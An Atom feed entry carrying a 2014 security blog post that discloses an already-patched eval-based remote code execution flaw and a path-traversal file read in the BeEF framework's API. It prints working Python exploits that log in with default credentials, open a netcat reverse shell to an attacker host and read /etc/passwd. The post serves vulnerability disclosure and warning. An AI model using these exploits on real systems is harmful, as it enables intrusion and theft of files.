<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: beef | ]]></title>
  <link href="http://hatRiot.github.io/blog/categories/beef/atom.xml" rel="self"/>
  <link href="http://hatRiot.github.io/"/>
  <updated>2020-08-10T13:11:36-07:00</updated>
  <id>http://hatRiot.github.io/</id>
  <author>
    <name><![CDATA[Bryan Alexander]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[rce in browser exploitation framework (BeEF)]]></title>
    <link href="http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef/"/>
    <updated>2014-05-13T19:57:53-07:00</updated>
    <id>http://hatRiot.github.io/blog/2014/05/13/rce-in-browser-exploitation-framework-beef</id>
    <content type="html"><![CDATA[<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>

<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>

<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>

<p>```</p>

<h1>Adds a new DNS rule</h1>

<pre><code>    post '/rule' do
      begin
        body = JSON.parse(request.body.read)

        pattern = body['pattern']
        type = body['type']
        response = body['response']

        # Validate required JSON keys
        unless [pattern, type, response].include?(nil)
          # Determine whether 'pattern' is a String or Regexp
          begin

            pattern_test = eval pattern
            pattern = pattern_test if pattern_test.class == Regexp
</code></pre>

<p>   #             end</p>

<pre><code>          rescue =&gt; e;
          end
</code></pre>

<p>```</p>

<p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>

<p>```
import requests
import json
import sys</p>

<p>def fetch_default(ip):</p>

<pre><code>url = 'http://%s:3000/api/admin/login' % ip
headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
data = { 'username' : 'beef', 'password' : 'beef' }

response = requests.post(url, headers=headers, data=json.dumps(data))
if response.status_code is 200 and json.loads(response.content)['success']:
    return json.loads(response.content)['token']
</code></pre>

<p>try:</p>

<pre><code>ip = '192.168.1.6'

if len(sys.argv) &gt; 1:
    token = sys.argv[1]
else:
    token = fetch_default(ip)

if not token:
    print 'Could not get auth token'
    sys.exit(1)

url = 'http://%s:3000/api/dns/rule?token=%s' % (ip, token)
sploit = '%x(nc 192.168.1.97 4455 -e /bin/bash)'

headers = { 'Content-Type' : 'application/json; charset=UTF-8' }
data = { 'pattern' : sploit,
         'type' : 'A',
         'response' : [ '127.0.0.1' ]
       }

response = requests.post(url, headers=headers, data=json.dumps(data))
print response.status_code
</code></pre>

<p>except Exception, e:</p>

<pre><code>print e
</code></pre>

<p>```</p>

<p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>

<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>

<p>```
def run_lfi(ip, token):</p>

<pre><code>url = 'http://%s:3000/api/server/bind?token=%s' % (ip, token)
headers = { 'Content-Type' : 'application/json'}
data = { 'mount' : "/tmp.txt",
         'local_file' : "/../../../etc/passwd"
       }

response = requests.post(url, headers=headers, data=json.dumps(data))
print response.status_code
</code></pre>

<p>```</p>

<p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>
]]></content>
  </entry>
  
</feed>
